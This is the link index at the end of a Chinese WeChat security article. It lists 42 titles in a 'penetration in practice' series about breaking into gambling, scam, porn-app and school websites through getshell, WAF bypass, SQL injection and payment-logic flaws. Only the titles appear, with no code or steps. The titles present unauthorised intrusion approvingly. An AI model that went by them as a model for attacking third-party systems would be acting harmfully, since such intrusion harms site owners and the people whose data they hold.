▶[【渗透实战系列】|42 - 防范诈骗，记一次帮助粉丝渗透黑入某盘诈骗的实战](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247510964&idx=1&sn=4b857ff3d26e56b291d18493232d0638&chksm=ce64012df913883b73fcf343810440eb9c19f523880337af0c9b622e61d67fcddce8f0a272f6&scene=21#wechat_redirect)

▶[【渗透实战系列】|41 - 记一次色 * 情 app 渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247509187&idx=1&sn=34722c6498eb7bbe372f2201bf908c1b&chksm=ce640e5af913874c23a060281b6d0d30a8cab97beeb4e1a03be251a4e08da9041a0720dcec0c&scene=21#wechat_redirect)

▶[【渗透实战系列】|40-APP 渗透测试步骤（环境、代理、抓包挖洞）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247507650&idx=2&sn=76005600d8c42ecb604536089fc4444e&chksm=ce64745bf913fd4d49a2055f9b1184967eaff3b6be6a07ea92022665331df84dbec2ed142833&scene=21#wechat_redirect)

[▶【渗透实战系列】|39-BC 渗透的常见切入点（总结）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247506967&idx=1&sn=571938dac191539a98b76c02203a8394&chksm=ce64768ef913ff980ea03760984c375b5103a649595b4794a8cc31514cec5669543241296bef&scene=21#wechat_redirect)

▶[【渗透实战系列】|38 - 对某色情直播渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247506696&idx=1&sn=f6217101c0940b1e74c1d8715c1f3f0e&chksm=ce647191f913f887951f379c0aa305f818764b78f81edcd0a5517fe946c2bebacab7add3af70&scene=21#wechat_redirect)

▶[【渗透实战系列】|37-6 年级小学生把学校的网站给搞了！](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247506002&idx=1&sn=f6ba883a729ec9238ddac2354e3b0227&chksm=ce6472cbf913fbdd4dd1810297e06414fd1b1f5aaed37a662453a3a63202fad356f502652bfb&scene=21#wechat_redirect)

▶[【渗透实战系列】|36 - 一次 bc 推广渗透实战](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247502971&idx=1&sn=9f0793a2dd495d31d4c7f3888f408d93&chksm=ce6466e2f913eff421f3808538ee1e227c4797051a71509caa8d216e6ed6b56f51c3948e87f1&scene=21#wechat_redirect)

▶[【渗透实战系列】|35 - 旁站信息泄露的 dedecms 站点渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247502760&idx=2&sn=32c3aac95cc15c84c42b071425d19f91&chksm=ce646131f913e8279797a39aa8f513d7907d0e7c06ed0e4352b7603cb2d014a4a17eeac548ce&scene=21#wechat_redirect)

▶[【渗透实战系列】|34 - 如何用渗透思路分析网贷诈骗链](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247502166&idx=1&sn=3fe78999b5b43a059e66975dd185b3cc&chksm=ce6463cff913ead9c3a448d7466b7c38ed593a709918265283387ad4bb787292bdd2979e7d64&scene=21#wechat_redirect)

▶[【渗透实战系列】|33-App 渗透 , 由 sql 注入、绕过人脸识别、成功登录 APP](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247501582&idx=1&sn=6c1f7e2d823e1534dfcd419bbd6269eb&chksm=ce646d97f913e481224810cb34eac51cfcbf4c898bf1a2c309295d24d06231f9984c743ae8d4&scene=21#wechat_redirect)

▶[【渗透实战系列】|32-FOFA 寻找漏洞，绕过杀软拿下目标站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247500037&idx=1&sn=d59534ffc13b5dcbc64e93997ab3b485&chksm=ce646b9cf913e28a1c35e0f9919d48089bbb2e6b74ddb51ba27928c5cca0b361c4c80b0d03ea&scene=21#wechat_redirect)

▶[【渗透实战系列】|31 - 记一次对学校的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247497185&idx=1&sn=10025ea64a53bd4cce9ac791f3dd5e20&chksm=ce645f78f913d66e4c3851afdb2a25a655f2d80a817cf417b8f3be0d498135eff98a16c9cf86&scene=21#wechat_redirect)

▶[【渗透实战系列】|30 - 从 SQL 注入渗透内网（渗透的本质就是信息搜集）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247492600&idx=1&sn=96ffe18e7d13485dce4fce75863a3a3e&chksm=ce644961f913c077544775c87a3f6f5aa32c43424756a09806e715075e3f0479e1451b6ed114&scene=21#wechat_redirect)

▶[【渗透实战系列】|29 - 实战 | 对某勒索 APP 的 Getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247491951&idx=1&sn=38abc3e92e234e6cf9734c4f73537561&chksm=ce644bf6f913c2e0dea91966fc01a004ce9cff0e596ddfc5b64d5e9f44ab5f2649bb4b5060a3&scene=21#wechat_redirect)  

▶[【渗透实战系列】|28 - 我是如何拿下 BC 站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247491584&idx=1&sn=d7be0c7c6b7bce795fbf15d3ad781329&chksm=ce644a99f913c38f205db6560c11b32ad240c4e45795aa670b9edbd05f48c54069e04dbde329&scene=21#wechat_redirect)

▶[【渗透实战系列】|27 - 对钓鱼诈骗网站的渗透测试（成功获取管理员真实 IP）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247491135&idx=1&sn=1fc02f90c8f4fc93a70600da5e6b74bd&chksm=ce67b4a6f9103db0b0dbe9aebb44b910bc5b9bcebebb53f2d71216de2772f434730f825d0aae&scene=21#wechat_redirect)

▶[【渗透实战系列】|26 一记某 cms 审计过程 (步骤详细)](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247490747&idx=1&sn=70a1e5cf68fd3c4f03737be331f93fd3&chksm=ce67b622f9103f34c2a4f150c2ea47aea01fc5ec3da10e45b36bc817ff54ffc0b013126f5f56&scene=21#wechat_redirect)

▶[【渗透实战系列】|25 一次从 APP 逆向到 Getshell 的过程](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247490236&idx=2&sn=2eddaa77b0e7910c67285a855efb1a05&chksm=ce67b025f9103933121b6df068aed6fd99feaac7a04183e0a773086633a7bd7f85339c5bd82e&scene=21#wechat_redirect)

▶[【渗透实战系列】|24 - 针对 CMS 的 SQL 注入漏洞的代码审计思路和方法](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247488259&idx=2&sn=273a82e72fb6444bb146341005d1c08f&chksm=ce67b99af910308cc49e786e2da5fead40de6f0fb5eaf0a0204452603b3366c2bb5a78bb3410&scene=21#wechat_redirect)

▶[【渗透实战系列】|23 - 某菠菜网站渗透实战](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247487961&idx=2&sn=2f514d32e56179711d31a63954994cad&chksm=ce67bb40f9103256d21e10cfc1bcc5c2e8833303aa8fc48b750e3d90269100f91d6bbb05d5e3&scene=21#wechat_redirect)

▶[【渗透实战系列】|22 - 渗透系列之打击彩票站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247487003&idx=1&sn=5c85b34ce6ffb400fdf858737e34df3d&chksm=ce67a482f9102d9405e838f34479dc8d1c6b793d3b6d4f40d9b3cec9cc87f14555d865cb3ddc&scene=21#wechat_redirect)

▶[【渗透实战系列】|21 一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486970&idx=1&sn=c03c523e8962b6a6487328d7581163fa&chksm=ce67a763f9102e751021376f0dd566b50094925852d5aefb7196c96456e16886ecc4e695860e&scene=21#wechat_redirect)

▶[【渗透实战系列】|20 - 渗透直播网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486897&idx=1&sn=4489b16f5ec0f25f7390d635e89d414e&chksm=ce67a728f9102e3e2469c23c3b4004dfd76d68f8f1f03b3d2ef948480a1d422ad16b67a8a7f6&scene=21#wechat_redirect)

▶[【渗透实战系列】|19 - 杀猪盘渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486570&idx=1&sn=0c20fbbf4adbeb5b555164438b3197f7&chksm=ce67a6f3f9102fe51b76482cd7d6bb644631ae469d8c1802956034077137ecd49ea56c8d2b1f&scene=21#wechat_redirect)

▶[【渗透实战系列】|18 - 手动拿学校站点 得到上万人的信息（漏洞已提交）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486527&idx=1&sn=c1d4f51269e16d5dfdf110c91a8f19e4&chksm=ce67a6a6f9102fb07ad71789894824f553bd1207a3637da8a79b42868a9a9db900fb6d8aa358&scene=21#wechat_redirect)

▶[【渗透实战系列】|17 - 巧用 fofa 对目标网站进行 getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486499&idx=1&sn=7b8c8acc40e1281f1e388f799e7d2229&chksm=ce67a6baf9102facdd7d574719c51e33521308d9b76f53e5462c59674c9d38f18f213e8b1920&scene=21#wechat_redirect)

▶[【渗透实战系列】|16 - 裸聊 APP 渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486466&idx=1&sn=121b62ef2740e8474119c3914d363e4c&chksm=ce67a69bf9102f8deac87602cbb4504f9a59336fb0113f728164c65048d0962f92dd2dd66113&scene=21#wechat_redirect)

▶[【渗透实战系列】|15 - 博彩网站（APP）渗透的常见切入点](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486411&idx=1&sn=e5227a9f252f797bf170353d18222d6a&chksm=ce67a152f9102844551cf537356b85a6920abb084d5c6a26f7f8aea6870f51208782ac246ee2&scene=21#wechat_redirect)

▶[【渗透实战系列】|14 - 对诈骗（杀猪盘）网站的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486388&idx=1&sn=cfc74ce3900b5ae89478bab819ede626&chksm=ce67a12df910283b8bc136f46ebd1d8ea59fcce80bce216bdf075481578c479fefa58973d7cb&scene=21#wechat_redirect)

▶[【渗透实战系列】|13-waf 绕过拿下赌博网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486335&idx=1&sn=4cb172171dafd261c287f5bb90c35249&chksm=ce67a1e6f91028f08de759e1f8df8721f6c5a1e84d8c5f0948187c0c5b749fa2acdd4228b8e7&scene=21#wechat_redirect)

▶[【渗透实战系列】|12 - 渗透实战， 被骗 4000 花呗背后的骗局](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486245&idx=1&sn=ebfcf540266643c0d618e5cd47396474&chksm=ce67a1bcf91028aa09435781e951926067dcf41532dacf9f6d3b522ca2df1be8a3c8551c1672&scene=21#wechat_redirect)

▶[【渗透实战系列】|11 - 赌博站人人得而诛之](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486232&idx=1&sn=301810a7ba60add83cdcb99498de8125&chksm=ce67a181f9102897905ffd677dafeb90087d996cd2e7965300094bd29cba8f68d69f675829be&scene=21#wechat_redirect)

▶[【渗透实战系列】|10 - 记某色 X 商城支付逻辑漏洞的白嫖（修改价格提交订单）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486060&idx=1&sn=a4b977e9e3bbfe7b2c9ec479942e615c&chksm=ce67a0f5f91029e30c854eb2f71173efe925a38294fd39017708abcf4deea5c2b25dee518ebf&scene=21#wechat_redirect)

▶[【渗透实战系列】|9 - 对境外网站开展的一次 web 渗透测试（非常详细，适合打战练手）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486042&idx=1&sn=4022c7f001ca99dc6837d51b759d5104&chksm=ce67a0c3f91029d5f1ac9dc24d23cb390630db1cc3f8e76398cf097a50e29e0b98e9afcb600a&scene=21#wechat_redirect)

▶[【渗透实战系列】|8 - 记一次渗透测试从 XSS 到 Getshell 过程（详细到无语）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486005&idx=3&sn=55aad92a300e5a6410aa194b521e11b2&chksm=ce67a0acf91029ba5cd51fbe7c5682fd3eab8a257cf1f6bae44fdaa871bbac7edd51440e4cf8&scene=21#wechat_redirect)

▶[【渗透实战系列】|7 - 记一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485901&idx=1&sn=84b5dac005c838c1b6d22fc4207c81c1&chksm=ce67a354f9102a42260468d305734ed7ea437715ee508f2b3eeb8afa0727b7f4ae652909ff44&scene=21#wechat_redirect)

▶[【渗透实战系列】|6- BC 杀猪盘渗透一条龙](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485861&idx=1&sn=39318b76da490ed2a8746134f685d454&chksm=ce67a33cf9102a2aa3793cafbd701c77f851ca9dac3f827524b5cfe093cbecb14892ee131400&scene=21#wechat_redirect)

▶[【渗透实战系列】|5 - 记一次内衣网站渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485826&idx=2&sn=8f11b7cc12f6c5dfb5eeeb316f14f460&chksm=ce67a31bf9102a0d704877584dc3c49141a376cc1b35c0659f3ae72baa7e77e6de7e0f916db5&scene=21#wechat_redirect)

▶[【渗透实战系列】|4 - 看我如何拿下 BC 站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485789&idx=2&sn=a1a3c9fc97eeab0b5e5bd3d311e3fae6&chksm=ce67a3c4f9102ad21ce5c895d364b4d094391d2369edfc3afce63ed0b155f8db1c86fa6924f1&scene=21#wechat_redirect)  

▶[【渗透实战系列】|3 - 一次简单的渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485778&idx=2&sn=997ecdc137f7ae88737e827b29db4e45&chksm=ce67a3cbf9102add52833faf5ad7346affc93589fc8babf72468997c2dbd88c25e8f06d8a7e0&scene=21#wechat_redirect)

▶[【渗透实战系列】|2 - 记一次后门爆破到提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485647&idx=2&sn=28a227ff21a6a99e323f6e27130a5ad5&chksm=ce67a256f9102b4030db2fc636ff1d454d46178fc2003368305cdc06ae2a4c81dd011dfcb361&scene=21#wechat_redirect)

▶[【渗透实战系列】|1 一次对跨境赌博类 APP 的渗透实战（getshell 并获得全部数据）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485589&idx=1&sn=f4f64ea923675c425f1de9e4e287fb07&chksm=ce67a20cf9102b1a1a171041745bd7c243156eaee575b444acc62d325e2cd2d9f72b2779cf01&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONSgp1TKd5oeaGb76g5eMFibnANHNp30ic7NtpVnU12TNkBynw2ju7RDHbYtVZibm5rjDh7VKbAEyO8ZQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1)  

**长按 - 识别 - 关注**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONTgEGpyZx7OiaI1JkST23pJPIIgiaejD1CAyicricZQeBtf4rYlib4NmVKjiah6icBHjWwOu54zq6Wvib0HIg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1)

**Hacking 黑白红**

一个专注信息安全技术的学习平台

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&retryload=1)

点分享

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&retryload=1)

点收藏

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&retryload=1)

点点赞

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&retryload=1)

点在看